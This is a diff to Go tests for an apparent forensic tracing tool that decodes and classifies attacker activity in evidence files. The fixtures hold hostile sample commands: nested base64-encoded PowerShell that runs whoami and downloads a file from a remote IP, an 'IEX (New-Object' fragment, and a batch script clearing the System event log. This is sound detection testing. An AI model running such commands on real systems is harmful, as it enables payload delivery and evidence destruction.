@@ -1,8 +1,11 @@
 package trace
 
 import (
+	"encoding/base64"
+	"encoding/binary"
 	"slices"
 	"testing"
+	"unicode/utf16"
 
 	"github.com/get-sybers/slopmop/internal/activity"
 	"github.com/get-sybers/slopmop/internal/evidence"
@@ -234,8 +237,8 @@ func TestBuildStructuredReports(t *testing.T) {
 		{
 			name:       "json with an encoded powershell command",
 			file:       "events.jsonl",
-			text:       `{"ProcessCommandLine": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"}` + "\n",
-			tools:      []string{"powershell.exe"},
+			text:       `{"ProcessCommandLine": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="}` + "\n",
+			tools:      []string{"powershell.exe", "new-object", "iex"},
 			transforms: []string{"EncodedCommand"},
 			indicators: 1,
 		},
@@ -338,5 +341,76 @@ func TestBuildActivities(t *testing.T) {
 	}
 	if plain := steps["notes.txt"]; len(plain.Activities) != 0 || len(plain.Tactics) != 0 {
 		t.Errorf("notes.txt = %+v, want no activity and no tactic", plain)
+	}
+}
+
+// encodeCommand encodes a script as PowerShell's -EncodedCommand takes it.
+func encodeCommand(script string) string {
+	units := utf16.Encode([]rune(script))
+	raw := make([]byte, 0, 2*len(units))
+	for _, u := range units {
+		raw = binary.LittleEndian.AppendUint16(raw, u)
+	}
+	return base64.StdEncoding.EncodeToString(raw)
+}
+
+func TestBuildReadsEncodedPayloads(t *testing.T) {
+	inner := "whoami /all; (New-Object Net.WebClient).DownloadFile('http://198.51.100.7/a.bin', 'a.bin')"
+	outer := "powershell.exe -nop -enc " + encodeCommand(inner)
+	wrapped := "cmd /c powershell -enc " + encodeCommand(outer)
+	files := []evidence.File{
+		{Path: "stage.ps1", Role: evidence.Script},
+		{Path: "run.cmd", Role: evidence.Output},
+		{Path: "plain.ps1", Role: evidence.Script},
+	}
+	texts := map[string]string{
+		"stage.ps1": outer + "\n",
+		"run.cmd":   wrapped + "\r\n",
+		"plain.ps1": "Get-Date\n",
+	}
+	steps := map[string]Step{}
+	for _, s := range Build(files, texts, loadTables(t)).Steps {
+		steps[s.File.Path] = s
+	}
+	for _, path := range []string{"stage.ps1", "run.cmd"} {
+		s := steps[path]
+		if !slices.Contains(s.Tools, "whoami") || !slices.Contains(s.Tools, "new-object") {
+			t.Errorf("%s tools = %q, want those of the payload", path, s.Tools)
+		}
+		if len(s.Activities) != 1 || s.Activities[0].Name != "FileDownload" {
+			t.Errorf("%s activities = %+v, want FileDownload from the payload", path, s.Activities)
+		}
+		found := false
+		for _, m := range s.Matches {
+			found = found || m.Value == "198.51.100.7"
+		}
+		if !found {
+			t.Errorf("%s indicators = %+v, want the address in the payload", path, s.Matches)
+		}
+		if !slices.Contains(s.Tactics, "CommandAndControl") || !slices.Contains(s.Tactics, "Discovery") {
+			t.Errorf("%s tactics = %q, want those of the payload", path, s.Tactics)
+		}
+	}
+	if s := steps["run.cmd"]; !slices.Contains(s.Tools, "cmd") || !slices.Contains(s.Tools, "powershell") {
+		t.Errorf("run.cmd tools = %q, want the batch commands too", s.Tools)
+	}
+	if s := steps["plain.ps1"]; len(s.Activities) != 0 || !slices.Equal(s.Tools, []string{"get-date"}) {
+		t.Errorf("plain.ps1 = %+v, want it untouched", s)
+	}
+}
+
+func TestBuildBatchScript(t *testing.T) {
+	files := []evidence.File{{Path: "clean.bat", Role: evidence.Script}, {Path: "who.txt", Role: evidence.Output}}
+	texts := map[string]string{"clean.bat": "@echo off\r\nwhoami > who.txt\r\nwevtutil cl System\r\n", "who.txt": "corp\\u\n"}
+	steps := Build(files, texts, loadTables(t)).Steps
+	s := steps[0]
+	if s.File.Path != "clean.bat" || s.Turn != 1 || !slices.Equal(s.Tools, []string{"whoami", "wevtutil"}) {
+		t.Errorf("clean.bat = turn %d tools %q, want turn 1 with whoami and wevtutil", s.Turn, s.Tools)
+	}
+	if !slices.Equal(s.Outputs, []string{"who.txt"}) {
+		t.Errorf("clean.bat outputs = %q, want who.txt", s.Outputs)
+	}
+	if len(s.Activities) != 1 || s.Activities[0].Name != "EventLogClearing" {
+		t.Errorf("clean.bat activities = %+v, want EventLogClearing", s.Activities)
 	}
 }
